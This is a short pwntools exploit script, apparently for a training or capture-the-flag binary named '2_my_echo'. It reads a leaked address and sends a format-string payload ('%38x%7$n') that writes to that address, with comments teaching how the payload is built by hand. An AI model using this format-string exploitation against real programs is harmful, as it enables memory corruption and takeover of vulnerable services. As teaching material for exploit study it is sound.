from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./2_my_echo"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("address ")
leak = int(p.recvline()[:-1], 16)
print(leak)
log.info(str(leak))

# using the pwntools `fmtstr_payload` function
payload = fmtstr_payload(7, {leak: 1})

# manual payload
# i recommend learning how to manually create the payload
# as it'll familiarise you with how the payloads for these attacks work

# payload = [flagAddr] + %38x + %7$n
#            4 bytes   + 38 bytes = 42 bytes
payload = pack(leak) + b"%38x%7$n"
p.sendline(payload)

p.interactive()
